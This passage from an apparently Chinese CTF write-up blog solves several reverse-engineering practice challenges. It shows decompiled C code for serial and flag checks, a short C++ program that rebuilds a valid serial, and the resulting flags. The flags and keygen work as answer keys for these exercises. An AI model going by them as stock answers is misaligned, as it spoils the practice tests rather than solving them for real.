class="line">      || v13 != <span class="hljs-number">113</span></span><br><span class="line">      || v13 + v18 != <span class="hljs-number">170</span></span><br><span class="line">      || v14 != <span class="hljs-number">52</span></span><br><span class="line">      || v17 != <span class="hljs-number">103</span></span><br><span class="line">      || v15 != <span class="hljs-number">99</span></span><br><span class="line">      || v16 != <span class="hljs-number">56</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">strcpy_s</span>(&amp;Text, <span class="hljs-number">0x100</span>u, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;v28);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">strcpy_s</span>(&amp;Text, <span class="hljs-number">0x100</span>u, Src);</span><br><span class="line">      <span class="hljs-built_in">strcat_s</span>(&amp;Text, <span class="hljs-number">0x100</span>u, v11);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">strcpy_s</span>(&amp;Text, <span class="hljs-number">0x100</span>u, <span class="hljs-string">"Your E-mail address in not valid."</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">MessageBoxA</span>(hDlg, &amp;Text, <span class="hljs-string">"Registeration"</span>, <span class="hljs-number">0x40</span>u);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>过程十分简单，先简单判断邮箱是不是符合格式，如果符合进入序列号的判断，序列号的判断关键也就只有一个if条件，然后就会输出注册有没有成功</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">char</span> v11[<span class="hljs-number">17</span>]={<span class="hljs-number">0</span>};</span><br><span class="line">    v11[<span class="hljs-number">0</span>] = <span class="hljs-string">'C'</span>;</span><br><span class="line">    v11[<span class="hljs-number">15</span>] = <span class="hljs-string">'X'</span>;</span><br><span class="line">    v11[<span class="hljs-number">1</span>] = <span class="hljs-string">'Z'</span>;</span><br><span class="line">    v11[<span class="hljs-number">14</span>] = <span class="hljs-number">155</span>-v11[<span class="hljs-number">1</span>];</span><br><span class="line">    v11[<span class="hljs-number">2</span>] = <span class="hljs-number">57</span>;</span><br><span class="line">     v11[<span class="hljs-number">13</span>] = <span class="hljs-number">155</span>-v11[<span class="hljs-number">2</span>];</span><br><span class="line">    v11[<span class="hljs-number">3</span>] = <span class="hljs-number">100</span>;</span><br><span class="line">    v11[<span class="hljs-number">12</span>] = <span class="hljs-number">55</span>;</span><br><span class="line">    v11[<span class="hljs-number">4</span>] = <span class="hljs-number">109</span>;</span><br><span class="line">    v11[<span class="hljs-number">11</span>] = <span class="hljs-number">71</span>;</span><br><span class="line">    v11[<span class="hljs-number">5</span>] = <span class="hljs-number">113</span>;</span><br><span class="line">    v11[<span class="hljs-number">10</span>] = <span class="hljs-number">170</span>-v11[<span class="hljs-number">5</span>];</span><br><span class="line">    v11[<span class="hljs-number">6</span>] = <span class="hljs-number">52</span>;</span><br><span class="line">    v11[<span class="hljs-number">9</span>] = <span class="hljs-number">103</span>;</span><br><span class="line">    v11[<span class="hljs-number">7</span>] = <span class="hljs-number">99</span>;</span><br><span class="line">    v11[<span class="hljs-number">8</span>] = <span class="hljs-number">56</span>;</span><br><span class="line">    cout&lt;&lt;v11&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出结果为</p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CZ<span class="hljs-number">9</span>dmq<span class="hljs-number">4</span>c<span class="hljs-number">8</span><span class="hljs-name">g9</span><span class="hljs-name">G7</span>bAX</span><br></pre></td></tr></tbody></table></figure><h4 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h4><p>通过字符串找到关键函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">sub_401090</span><span class="hljs-params">(HWND hWnd, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3, <span class="hljs-keyword">int</span> a4)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+50h] [ebp-310h]</span></span><br><span class="line">  CHAR Text[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+154h] [ebp-20Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [esp+159h] [ebp-207h]</span></span><br><span class="line">  __int16 v8; <span class="hljs-comment">// [esp+255h] [ebp-10Bh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v9; <span class="hljs-comment">// [esp+257h] [ebp-109h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// [esp+258h] [ebp-108h]</span></span><br><span class="line">  CHAR String; <span class="hljs-comment">// [esp+25Ch] [ebp-104h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v12; <span class="hljs-comment">// [esp+25Fh] [ebp-101h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [esp+260h] [ebp-100h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v14; <span class="hljs-comment">// [esp+261h] [ebp-FFh]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;String, <span class="hljs-number">0</span>, <span class="hljs-number">0x104</span>u);</span><br><span class="line">  v10 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">16</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">DestroyWindow</span>(hWnd);</span><br><span class="line">    <span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">273</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1000</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">GetDlgItemTextA</span>(hWnd, <span class="hljs-number">1002</span>, &amp;String, <span class="hljs-number">260</span>);</span><br><span class="line">      <span class="hljs-built_in">strlen</span>(&amp;String);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;String) &gt; <span class="hljs-number">6</span> )</span><br><span class="line">        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);</span><br><span class="line">      v10 = <span class="hljs-built_in">atoi</span>(&amp;String) + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v10 == <span class="hljs-number">123</span> &amp;&amp; v12 == <span class="hljs-string">'x'</span> &amp;&amp; v14 == <span class="hljs-string">'z'</span> &amp;&amp; v13 == <span class="hljs-string">'y'</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">strcpy</span>(Text, <span class="hljs-string">"flag"</span>);</span><br><span class="line">        <span class="hljs-built_in">memset</span>(&amp;v7, <span class="hljs-number">0</span>, <span class="hljs-number">0xFC</span>u);</span><br><span class="line">        v8 = <span class="hljs-number">0</span>;</span><br><span class="line">        v9 = <span class="hljs-number">0</span>;</span><br><span class="line">        _itoa(v10, &amp;v5, <span class="hljs-number">10</span>);</span><br><span class="line">        <span class="hljs-built_in">strcat</span>(Text, <span class="hljs-string">"{"</span>);</span><br><span class="line">        <span class="hljs-built_in">strcat</span>(Text, &amp;v5);</span><br><span class="line">        <span class="hljs-built_in">strcat</span>(Text, <span class="hljs-string">"_"</span>);</span><br><span class="line">        <span class="hljs-built_in">strcat</span>(Text, <span class="hljs-string">"Buff3r_0v3rf|0w"</span>);</span><br><span class="line">        <span class="hljs-built_in">strcat</span>(Text, <span class="hljs-string">"}"</span>);</span><br><span class="line">        <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, Text, <span class="hljs-string">"well done"</span>, <span class="hljs-number">0</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-built_in">SetTimer</span>(hWnd, <span class="hljs-number">1u</span>, <span class="hljs-number">0x3E8</span>u, TimerFunc);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1001</span> )</span><br><span class="line">      <span class="hljs-built_in">KillTimer</span>(hWnd, <span class="hljs-number">1u</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现我们只要输入122xyz，就会输出flag，而且flag也可以直接拼凑出来</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{<span class="hljs-number">123</span>_Buff<span class="hljs-number">3</span>r_<span class="hljs-number">0</span>v<span class="hljs-number">3</span>rf|<span class="hljs-number">0</span>w}</span><br></pre></td></tr></tbody></table></figure><h4 id="re1-100"><a href="#re1-100" class="headerlink" title="re1-100"></a>re1-100</h4><p>这题题目里面的if实在是太多了，主要是为了判断是不是有debugger，所以不能通过调试的方式获得flag，所以还是要研究一下代码</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(bufParentRead) == <span class="hljs-number">42</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(&amp;bufParentRead[<span class="hljs-number">1</span>], <span class="hljs-string">"53fc275d81"</span>, <span class="hljs-number">10uLL</span>) )</span><br><span class="line">            {</span><br><span class="line">              <span class="hljs-keyword">if</span> ( bufParentRead[<span class="hljs-built_in">strlen</span>(bufParentRead) - <span class="hljs-number">1</span>] == <span class="hljs-string">'}'</span> )</span><br><span class="line">              {</span><br><span class="line">                <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(&amp;bufParentRead[<span class="hljs-number">31</span>], <span class="hljs-string">"4938ae4efd"</span>, <span class="hljs-number">10uLL</span>) )</span><br><span class="line">                {</span><br><span class="line">                  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">confuseKey</span>(bufParentRead, <span class="hljs-number">42</span>) )</span><br><span class="line">                  {</span><br><span class="line">                    <span class="hljs-built_in">responseFalse</span>();</span><br><span class="line">                  }</span><br><span class="line">                  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(bufParentRead, <span class="hljs-string">"{daf29f59034938ae4efd53fc275d81053ed5be8c}"</span>, <span class="hljs-number">42uLL</span>) )</span><br><span class="line">                  {</span><br><span class="line">                    <span class="hljs-built_in">responseTrue</span>();</span><br><span class="line">                  }</span><br><span class="line">                  <span class="hljs-keyword">else</span></span><br><span class="line">                  {</span><br><span class="line">                    <span class="hljs-built_in">responseFalse</span>();</span><br><span class="line">                  }</span><br><span class="line">                }</span><br><span class="line">                <span class="hljs-keyword">else</span></span><br><span class="line">                {</span><br><span class="line">                  <span class="hljs-built_in">responseFalse</span>();</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">              <span class="hljs-keyword">else</span></span><br><span class="line">              {</span><br><span class="line">                <span class="hljs-built_in">responseFalse</span>();</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">else</span></span><br><span class="line">            {</span><br><span class="line">              <span class="hljs-built_in">responseFalse</span>();</span><br><span class="line">            }</span><br></pre></td></tr></tbody></table></figure><p>截取了其中一段，这里把flag分成了4个部分，每段10个字符，已经知道第一段地最后一段，但是也知道经过<code>confuseKey()</code>之后flag是什么，所以我们只要研究一下<code>confusekey()</code>就可以了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> __cdecl <span class="hljs-title">confuseKey</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *szKey, <span class="hljs-keyword">int</span> iKeyLength)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> szPart1[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> szPart2[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> szPart3[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> szPart4[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)szPart1 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  *(_DWORD *)&amp;szPart1[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;szPart1[<span class="hljs-number">12</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  szPart1[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  *(_QWORD *)szPart2 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  *(_DWORD *)&amp;szPart2[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;szPart2[<span class="hljs-number">12</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  szPart2[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  *(_QWORD *)szPart3 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  *(_DWORD *)&amp;szPart3[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;szPart3[<span class="hljs-number">12</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  szPart3[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  *(_QWORD *)szPart4 = <span class="hljs-number">0LL</span>;</span><br><span class="line">  *(_DWORD *)&amp;szPart4[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  *(_WORD *)&amp;szPart4[<span class="hljs-number">12</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  szPart4[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( iKeyLength != <span class="hljs-number">42</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !szKey )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(szKey) != <span class="hljs-number">42</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( *szKey != <span class="hljs-string">'{'</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">strncpy</span>(szPart1, szKey + <span class="hljs-number">1</span>, <span class="hljs-number">0xA</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">strncpy</span>(szPart2, szKey + <span class="hljs-number">11</span>, <span class="hljs-number">0xA</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">strncpy</span>(szPart3, szKey + <span class="hljs-number">21</span>, <span class="hljs-number">0xA</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">strncpy</span>(szPart4, szKey + <span class="hljs-number">31</span>, <span class="hljs-number">0xA</span>uLL);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(szKey, <span class="hljs-number">0</span>, iKeyLength);</span><br><span class="line">  *szKey = <span class="hljs-number">123</span>;</span><br><span class="line">  <span class="hljs-built_in">strcat</span>(szKey, szPart3);</span><br><span class="line">  <span class="hljs-built_in">strcat</span>(szKey, szPart4);</span><br><span class="line">  <span class="hljs-built_in">strcat</span>(szKey, szPart1);</span><br><span class="line">  <span class="hljs-built_in">strcat</span>(szKey, szPart2);</span><br><span class="line">  szKey[<span class="hljs-number">41</span>] = <span class="hljs-number">125</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>内容挺多，实际上只实现了一件事情，把四段调换了一个顺序，变成了3421的顺序，所以调整一下顺序就出来了</p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53fc275d81053ed5be8cdaf29f59034938ae4efd</span><br></pre></td></tr></tbody></table></figure><h4 id="crazy"><a href="#crazy" class="headerlink" title="crazy"></a>crazy</h4><p>这题c++17编写，还有类，乍一看有点复杂，但实际上不是很难</p><p>还是先看关键函数，这里在main函数里就进行了处理</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v3; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v18; <span class="hljs-comment">// [rsp+10h] [rbp-130h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v19; <span class="hljs-comment">// [rsp+30h] [rbp-110h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v20; <span class="hljs-comment">// [rsp+50h] [rbp-F0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v21; <span class="hljs-comment">// [rsp+70h] [rbp-D0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v22; <span class="hljs-comment">// [rsp+90h] [rbp-B0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v23; <span class="hljs-comment">// [rsp+B0h] [rbp-90h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int64 v24; <span class="hljs-comment">// [rsp+128h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v24 = __readfsqword(<span class="hljs-number">0x28</span>u);</span><br><span class="line">  std::__cxx11::basic_string&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;::<span class="hljs-built_in">basic_string</span>(&amp;v18, argv, envp);</span><br><span class="line">  std::<span class="hljs-keyword">operator</span>&gt;&gt;&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;,std::allocator&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cin, &amp;v18);</span><br><span class="line">  v3 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"-------------------------------------------"</span>);</span><br><span class="line">  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">  v4 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"Quote from people's champ"</span>);</span><br><span class="line">  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">  v5 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"-------------------------------------------"</span>);</span><br><span class="line">  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">  v6 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(</span><br><span class="line">         &amp;std::cout,</span><br><span class="line">         <span class="hljs-string">"*My goal was never to be the loudest or the craziest. It was to be the most entertaining."</span>);</span><br><span class="line">  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">  v7 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"*Wrestling was like stand-up comedy for me."</span>);</span><br><span class="line">  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v7, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">  v8 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(</span><br><span class="line">         &amp;std::cout,</span><br><span class="line">         <span class="hljs-string">"*I like to use the hard times in the past to motivate me today."</span>);</span><br><span class="line">  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v8, &amp;std::endl&lt;<span class="hljs-keyword">char</span>,std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;);</span><br><span class="line">  v9 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="hljs-string">"-------------------------------------------"</span>);</span><br><span class="line">  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v9, &amp;std::endl&lt;<span 